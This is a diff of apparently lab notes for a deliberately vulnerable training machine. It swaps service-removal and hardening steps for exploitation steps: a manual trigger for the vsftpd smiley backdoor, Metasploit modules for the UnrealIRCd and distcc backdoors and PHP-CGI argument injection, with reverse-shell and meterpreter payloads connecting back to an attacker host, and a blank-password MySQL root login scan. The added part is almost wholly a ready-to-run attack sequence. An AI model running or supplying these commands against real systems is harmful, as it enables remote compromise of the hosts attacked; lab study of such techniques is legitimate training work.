@@ -32,44 +32,56 @@ CMD:
 Verification:
 - `sudo find / -name 'hosts.equiv' -exec cat "{}" \;`
 
+---
+
 ## 1. vsftpd Backdoor
 
-- `apt-get purge vsftpd`
-
-Verification:
-- `netstat -tlnp | grep 1524`
+- `telnet 172.16.30.60 21`
+- `user backdoored:)`
+- `pass invalid`
+- `quit`
+- `telnet 172.16.30.60 6200`
 
 ## 2. Samba Backdoor
 
-- `apt-get purge samba`
-
-Verification:
-- `netstat -tlnp | grep -E "139|445"`
+- `smbclient -L //172.16.30.60`
 
 ## 3. IRC Backdoor
 
-- `apt-get purge unrealircd`
-- `rm -rf /opt/Unreal3.2`
+- `msfconsole`
 
-Verification:
-- `netstat -tlnp | grep 6667`
+- `use exploit/unix/irc/unreal_ircd_3281_backdoor`
+- `set payload cmd/unix/reverse`
+- `set RHOST 172.16.30.60`
+- `set LHOST 172.16.30.75`
+- `exploit`
 
 ## 4. distcc Exploit
 
-- `apt-get purge distcc`
+- `msfconsole`
 
-Verification:
-- `netstat -tlnp | grep 3632`
+- `use exploit/unix/misc/distcc_exec`
+- `set payload cmd/unix/reverse`
+- `set RHOST 172.16.30.60`
+- `set LHOST 172.16.30.75`
+- `exploit`
 
 ## 5. MySQL Hardening
 
-- `CREATE USER 'student'@'%' IDENTIFIED BY 'password';`
+- `msfconsole`
+
+- `use auxiliary/scanner/mysql/mysql_login`
+- `set BLANK_PASSWORDS true`
+- `set RHOSTS 172.16.30.60`
+- `set USERNAME root`
+- `exploit`
 
 ## 6. PHP CGI Exploit
 
-- `apt-get install libapache2-mod-php5`
+- `msfconsole
 
-Verification:
-- `netstat -tlnp`
-
-
+- `use exploit/multi/http/php_cgi_arg_injection`
+- `set PAYLOAD php/meterpreter/reverse_tcp`
+- `set RHOST 172.16.30.60`
+- `set LHOST 172.16.30.75`
+- `run`
